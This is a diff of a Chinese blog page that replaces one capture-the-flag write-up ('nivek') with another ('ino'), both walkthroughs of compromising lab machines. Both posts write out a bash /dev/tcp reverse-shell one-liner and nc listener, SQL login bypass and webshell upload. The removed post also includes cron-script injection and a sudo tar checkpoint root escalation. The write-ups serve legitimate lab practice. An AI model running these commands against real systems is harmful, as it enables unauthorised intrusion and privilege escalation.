@@ -24,7 +24,7 @@
 
   
 
-  <title>nivek | 可乐加冰</title>
+  <title>ino | 可乐加冰</title>
 
   
 
@@ -98,11 +98,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">nivek</h1>
+          <h1 class="title-wrap">ino</h1>
           <h2 class="title-sub-wrap">
             <strong>可乐加冰</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2021-12-15T10:12:35.000Z" itemprop="datePublished">2021-12-15</time>
+            <time  class="article-date" datetime="2021-12-16T06:22:44.000Z" itemprop="datePublished">2021-12-16</time>
           </h2>
           <ul class="wrap-list dark">
   
@@ -133,9 +133,7 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p><strong>目标:获取2个flag值</strong><br><strong>1.对靶机端口版本进行探测</strong><br>    <img src="/images/1.png"><br>发现该靶机只有21ftp和22ssh,版本也未找到漏洞,上网查大佬们的博客才发现有个7080web端口<br><strong>2.进行访问是一个后台的登入页面</strong><br>    <img src="/images/2.png"><br>思路:1.用dirb进行爆破查找有没有字典存在2.用万能密码进行sql注入<br> 2.1 进行dirb目录扫描<br>    <img src="/images/3.png"><br>发现只有phpmyadmin数据库后台有用,没有账号密码一样没用啊只能换办法了<br> 2.2 sql注入万能密码注入<br>    <img src="/images/4.png"><br>发现需要有@符号才能进行写入,然后F12查看. 猜测前段代码限制了<br>    <img src="/images/5.png"><br>发现有type限制,把它删除后,在尝试一下万能密码注入进去了后台<br>    <img src="/images/6.png"><br>然后我一个一个按钮点击发现没有一个网页存在漏洞,就想F12查看有没有提示的隐藏文件<br>    <img src="/images/7.png"><br>在这里查看到一个setting.php的一个文件进行访问<br>    <img src="/images/8.png"></p>
-<p><strong>3.Getshell</strong><br>看了一下,有文件上传漏洞,话不多说写一句话木马,然后用burp进行抓包改包进行文件上传<br>    <img src="/images/9.png"><br>这个是文件上传最简单绕过只需要修改image/jpg就行了<br>    <img src="/images/10.png"><br>因为上传是一个php文件不是图片所以会显示不出来,然后右键它复制图像连接,然后用菜刀或者蚁剑连接得到一个shell<br>接下来用bash把shell反弹给kali<br>bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.199.128/5555 0&gt;&amp;1’  //用bash把shell给出去<br>在kali上nc -lnvp 5555   //监听自己的端口</p>
-<p><strong>4.提权</strong><br>    <img src="/images/11.png"><br>在/home/local.txt文件中获取第一个flag<br>与此同时在/home目录下发现一个用户为eren想进去看看里面文件发现权限不够 现在就是需要先拿到eren的shell,之后我找了好久目录都没发现什么能提权,之后我就看了大佬的博客<br>输入find / -perm -4000 -type f -exec ls -al {} ; 2&gt;/dev/null可以查看到很多用户文件的权限<br>    <img src="/images/14.png"><br>看到eren用户 有个/usr/bin/bash的文件,然后直接/usr/bin/bash -p就具有eren权限<br>    <img src="/images/15.png"><br>查看/home 目录下eren用户目录<br>    <img src="/images/12.png"><br>思路:脚本文件可以在里面加入一个命令让他运行反弹一个shell命令从而拿到eren用户的shell<br>    <img src="/images/13.png"><br>查看定时任务发现每5分钟会备份一次就是说会运行一次里面指令,刚好符合我之前思路<br>输入echo “bash -i &gt;&amp; /dev/tcp/192.168.3.30/1234 0&gt;&amp;1” &gt;&gt; backup.sh此命令等他5分钟后备份后反弹一个shell<br>    <img src="/images/16.png"><br>同时在kali打开新的命令行nc -lnvp 2000监听等待反弹shell<br>    <img src="/images/17.png"><br>输入sudo -l可以进行提权,接着输入sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh进行提权<br>    <img src="/images/18.png"><br>具有root权限后进入root目录查看flag<br>    <img src="/images/19.png"><br><strong>记一次渗透完成</strong></p>
+        <p>目标:获取靶机2个flag值<br><strong>1.对靶机端口扫描</strong><br><img src="/images/20.png"><br>发现开启了22,80端口,进行访问.<br><strong>2.web渗透</strong><br><img src="/images/21.png"><br>只是一个地块订购管理,都点了一下没什么用,F12看了前端代码也没什么隐藏信息,只好无奈的拿去爆破目录.<br><img src="/images/22.png"><br>发现有admin目录估计是后台登入系统.<br><img src="/images/23.png"><br>果不其然是一个后台,还是一样思路看到后台第一反应要么sql注入要么爆破.<br><strong>思路1:sql注入.</strong><br>尝试万能账号密码因为这个最快不消耗时间.<br><img src="/images/24.png"><br>发现有可以用万能用户登入后台猜想成功.<br><img src="/images/25.png"><br>进入后台随便点点看到文件上传漏洞上传一句话木马<br><img src="/images/26.png"><br><strong>3.getshell</strong><br>居然没有任何防护连过滤都不需要(这是我做到最简单文件上传,其实可以用msfvenom做木马上传进行反弹shell但是我尝试后不明白kali已经连接上了但是有自己弹开了无奈只能用一句话木马)<br>目前问题:上传路径在哪里<br><img src="/images/27.png"><br>我在前端源码中看到了路径那么就去访问<br><img src="/images/28.png"><br>这个路径不就出来了嘛用蚁剑连接然后用bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.199.128/1234 0&gt;&amp;1’ kali nc-lnvp 1234 反弹shell给kali<br><img src="/images/29.png"><br>一般vulnhub虚拟机拿到shell后在提权在拿一个shell<br>第一个flag:在/home/ppp/local.txt (我用www-data权限还能访问到ppp目录是我没想到的)<br><img src="/images/30.png"><br><strong>4.提权</strong><br>/home目录下只有一个ppp估计是要提权到ppp用户考这个用户在进一步拿到root权限<br><img src="/images/31.png"><br>我想在/etc/passwd目录下看看ppp用户的权限结果看到了/bin/bash有某个命令权限就验证我的想法是对的<br><img src="/images/32.png"><br>用find命令查找到/etc目录下有ppp目录<br><img src="/images/33.png"><br>在目录下查看到ppp的账号密码那么用户就提升为ppp了直接登入<br><img src="/images/34.png"><br>登入后看看/bin/bash是什么命令权限,发现是一个添加用户的权限,那还不简单添加一个权限为root的用户就行行了嘛<br><img src="/images/34.png"><br>成功添加提权并在/etc/root目录下看到flag<br><strong>一次渗透又完成了</strong></p>
 
       </section>
 
@@ -143,20 +141,20 @@
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2021/12/16/ino/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">ino</h2>
+        <a href="/2021/12/15/nivek/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">nivek</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
